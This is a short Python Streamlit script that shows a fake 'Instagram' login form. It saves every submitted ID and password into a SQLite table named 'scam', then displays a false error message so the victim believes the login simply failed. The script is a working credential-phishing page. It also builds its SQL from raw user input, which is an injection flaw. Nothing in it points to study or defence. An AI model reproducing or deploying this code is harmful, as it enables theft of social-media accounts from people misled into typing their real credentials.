import sqlite3
import streamlit as st

con = sqlite3.connect('sql.db')

cursor =con.cursor()
st.title("Instagram Test feature ")

id_ =st.text_input("instagram id: ")

password = st.text_input("password: ")

bt = st.button("Log in")
if bt:
     cursor.execute(f"insert into scam values('{id_}','{password}');")
     con.commit()
     st.error("Enter Correct Instagram Id or Password")
